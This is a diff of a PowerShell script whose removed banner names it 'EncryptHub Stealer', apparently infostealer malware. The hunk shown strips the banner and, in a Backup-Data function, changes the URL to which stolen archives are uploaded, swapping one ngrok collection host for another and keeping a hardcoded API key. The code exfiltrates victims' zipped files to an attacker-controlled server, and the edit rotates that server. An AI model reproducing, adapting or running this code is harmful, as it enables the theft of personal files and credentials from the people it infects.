@@ -1,13 +1,3 @@
-#╔═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
-#║          _____                             _   _   _       _       ____  _             _                      ║
-#║         | ____|_ __   ___ _ __ _   _ _ __ | |_| | | |_   _| |__   / ___|| |_ ___  __ _| | ___ _ __            ║
-#║         |  _| | '_ \ / __| '__| | | | '_ \| __| |_| | | | | '_ \  \___ \| __/ _ \/ _` | |/ _ \ '__|           ║
-#║         | |___| | | | (__| |  | |_| | |_) | |_|  _  | |_| | |_) |  ___) | ||  __/ (_| | |  __/ |              ║
-#║         |_____|_| |_|\___|_|   \__, | .__/ \__|_| |_|\__,_|_.__/  |____/ \__\___|\__,_|_|\___|_|              ║
-#║                                |___/|_|                                                                       ║
-#║                                                                                                               ║
-#║                                    Red Teaming and Offensive Security                                         ║
-#╚═══════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
 $webhook = ""
 $debug=$false
 $blockhostsfile=$false
@@ -1360,7 +1350,7 @@ function Backup-Data {
 	$apiKey = "encrypthub_asseq2QSsxzc"
 	$fileName = [System.IO.Path]::GetFileName($zipFilePath)
     $base64FileName = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($fileName))
-	$url = "https://mainstream.ngrok.app/?method=UploadFile&filename=$base64FileName"
+	$url = "https://mainrunner.ngrok.app/?method=UploadFile&filename=$base64FileName"
 	Write-Host "[!] Archive sending to: $url"
 	$RezWebClient = New-Object System.Net.WebClient
 	$RezWebClient.Headers.Add("Api-Key", $apiKey)
